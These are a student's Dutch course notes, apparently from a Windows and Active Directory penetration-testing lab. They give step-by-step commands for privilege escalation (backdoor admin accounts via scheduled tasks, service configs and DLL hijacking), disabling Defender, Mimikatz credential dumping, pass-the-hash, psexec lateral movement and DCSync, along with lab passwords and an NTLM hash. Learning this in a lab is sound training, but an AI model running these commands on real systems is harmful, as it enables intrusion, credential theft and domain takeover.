 ## Week 1 
Kickoff
## Week 2
```bat
net user USERNAME L3tm3!n /add
net localgroup Administrators USERNAME /add
```

1. Kijken welke programma's al op de pc staan
	1. Ik kan cmd openen
	2. Powershell is geblockt door admin
2. In Program Files   
	1. File Permissions Service gevonden in Program Files
	2. Insecure Registry Service gevonden in Program Files
	3. RUXIM? uitzoeken wat dit is
	4. DLL Hijack Service
	5. DACL Service
3. In Program Files (x86):
	1. Tweaking.com ??
	2. Remote Mouse (heb je admin rechten voor nodig)
  
2. Kijken welke services draaien met welke priviliges
3. Welke users?
	1. Administrators
	2. Normaluser
	3. Public
4. **SCHEDULED TASKS:** In task migrated staat een pinger file. Die wordt getriggerd bij login. Er wordt een batch script uitgevoerd, met het pad C:\\temp\\pinger.bat. Dat batch script kan je aanpassen. 
	1. `C:\Windows\Tasks Migrated\`
	2. Ik zie daar een pinger file, daarin staat dat `C:\temp\pinger.bat` wordt aangeroepen bij een logon. Maak een backup van origineel, een maak een nieuwe pinger.bat
	3. Zet dit erin: `cmd /c net user backdoor L3tm3!n /add && cmd /c net localgroup Administrators backdoor /add`
	4. Open cmd en check of de user is aangemaakt met `net local users` en `net localgroup Administrators`
5. Rechtsonder, remote mouse staat aan. Daarin kan je op change klikken, dat opent een verkenner. Daarin kan je cmd.exe openen en heb je een admin shell.
	1. rafael:hacker123!
6. In services was een insecure regedit service
	1. Je kan de ImagePath aanpassen via regedit. Navigeer na HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\regcvs en pas de ImagePath aan naar een juist commando. Voer dan de service opnieuw uit.unquoted
	2. Verifieer door een shell te open en `net users` uit te voeren in cmd
7. Unquoted Path service
	1. Heb via softonic een bat to exe converter gedownload, vervolgens die Common.exe genoemd en in C:\\Program Files\\Unquoted Path Service geplaatst. Awesome. Batchscript is gewoon dezelfde commands als hiervoor.

## Week 3

```bash
cmd /c net user backdoor L3tm3!n /add && net localgroup Administrators backdoor /add
```

1. Met sysinternals sweet kijken naar welke rechten de normaluser heeft, 
	1. `C:\Tools\SysinternalsSuite\accesschk.exe -uwvc "normaluser"`
	2. Hieruit blijkt dat je CHANGE_SERVICE_CONFIG priviliges hebt. 
	3. Verander de service als volgt: `sc config daclsvc binPath="cmd /c net user backdoor L3tm3!n /add && net localgroup Administrators backdoor /add"`
	4. Check of het is gelukt met `net users` en `net localgroup Administrators`
      
2. DEFENDER UITZETTEN ALS LOCAL ADMIN:
	1. Open Windows Security -> Virus en Threat protection -> Manage Settings ->
	2. Login door als username `.\backdoorusername` en je wachtwoord in te voeren
	3. Add or remove exclusions
	4. Voeg de hele C: schijf toe als exclusion
	   
3. mimikatz
	1. Start mimikatz `C:\Tools\[mimikatz]\x64\mimikatz.exe`
	2. Voer dit in `privilege::debug`
	3. Check login-pogingen: `sekurlsa::logonpasswords`
		1. Onder Admin, zie je bij de NTLM hash `af99...` staan. Vaak gebruiken mensen dezelfde wachtwoorden. Kan je die gebruiken om in te loggen.
		2. Commando: `sekurlsa::pth /user:Administrator /ntlm:[HASH] /domain:example.local /run:cmd.exe
		3. Als je `whoami` doet, dan krijg je je localuser te zien, je eigen admin user. MAAR: je hebt wel zijn sleutels. Je bent nog steeds jezelf, maar je hebt zijn privileges. Weet niet hoe ik dit kan verifiëren. Aan chatGPT vragen.
`
4. System privileges krijgen (VOOR ALS JE GEEN DEBUG PRIVILEGE KAN DOEN IN MIMIKATZ)
	1. Open cmd als admin
	2. Ga naar sysinternals `C:\Tools\Sysinternals`
	3. Run `psexec -s -i cmd`
	4. In de shell die opent, doe `whoami` .
	5. Als het goed is ben je een system user. Nu kan je wel mimikatz privilege::debug uitvoeren als het goed is. 


## Week 4-5

DLL HIJACK SERVICE
1. `sc create <servicename> binpath=<path\to\service.exe` 
2. Open procmon (Process Monitor)
3. Voeg filters toe:
	1. `Process Name is dllhijackservice.exe`
	2. `Result is NAME NOT FOUND`
	3. `Path ends with .dll`
4. Druk op capture in procmon
5. Bovenaan zie je een pad naar een dll in dezelfde directory als de service.exe. Je hebt geen macht over de Program Files directory. Windows kijkt naar alles in Path. Welk path heb je wel write permissions over? 
	1. Check het met `echo %path%`
	2. Daar zag ik `C:\temp` staan.
6. Kan je een dll maken met jouw commands?
	1. Zelf dacht ik aan gewoon ChatGPT C code laten maken. Compilen en klaar. Ik heb de C code van BrightSpace gepakt. 
	2. Code: 
	   ![[Pasted image 20240923141018.png]]
	3. Gecompiled met GCC: `gcc code.c -shared -o hijackme.dll`
	4. De dll in C:\Temp gezet. 

Je kan informatie krijgen als normale user:
1. `net user /domain`
2. `net group /domain`
3. `net group "domain admins /domain
4. Ga naar je sysinternals directory
	1. Gebruik angry ip-scanner om te kijken wat de ip van de admin is
	2. `psloggedon \\192.168.56.30` (werkt niet??)

Haal nu weer de hashes op via mimikatz (dus defender uitschakelen), en hetzelfde doen. Doe de pass the hash, zoals vorige week. 
1. Verifieer in je nieuwe shell: `dir \\192.168.56.30\c$`
2. Ga naar je sysinternals folder lokaal
3. Doe dit commando: `psexec /accepteula -r random_naam \\192.168.56.30 cmd` en wacht eventjes.
4. Je ziet de Windows hello message, dus een nieuwe shell is geopend
5. Doe dit commando: `hostname`
	1. Als het goed is, zie je `win10adm`. 
6. Disable Defender:
	1. `powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"`
	2. `reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f`
	3. `powershell -Command "Remove-MpPreference -ExclusionPath 'C:\'"`
7. Copy mimikatz naar win10admin:
	1. `mkdir C:\tmp`
	2. `powershell -Command "Add-MpPreference -ExclusionPath 'C:\tmp'
	3. Valideer:  `powershell -Command "Get-MpPreference`
	4. `curl -L -o jippie.zip https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919/mimikatz_trunk.zip`
	5. `powershell -command "Expand-Archive -Path mimikatz.zip -DestinationPath C:\Path\To\Extract"`
8. Of:
	1. Kopieer C drive van client naar x drive van admin: 
	   `net use X: \\win10client\C$ /user:win10client\rafael L3tm3!n`
9. Ga je met mimikatz nogmaals een pass the hash doen.
	1. open mimikatz
	2. `privilege::debug`
	3. `sekurlsa::logonpasswords`
	4. Je zou domad ergens moeten vinden, maar helaas. 
	5. Doe het commando met de hash die je hebt gevonden (let op username en domain) `sekurlsa::pth /user:domad /ntlm:cff48581d56085119bddffacfae51aeb /domain:adlab.local /run:cmd.exe`
	6. Verifieer: `dir 192.168.56.10\c$`
10. Open mimikatz weer lokaal, in de shell die is geopend na de mimikatz command met de hash van de server. Je hebt dus een lokale shell met rechten van de server. 
	1. `cd C:\tools\mimikatz\x64`
	2. Open mimikatz: `mimikatz.exe`
	3. in mimikatz: `privilege::debug`
	4. `lsadump::dcsync /domain:adlab.local /all /csv`\`
	5. Nu heb je een voldoende!!!
	   


## Week 6 
hele domain vinden: rechter muisklik op 'this pc', en dan properties, en device name, dan zie je win10client adlab local bla bla. 

## Week 8 ???
Toetsvragen: 

### BIJ SKILLSTEST:
Een van de verschillende manieren zal er komen, dus of scheduled task, dus of een service, dus of user permissions checken. 
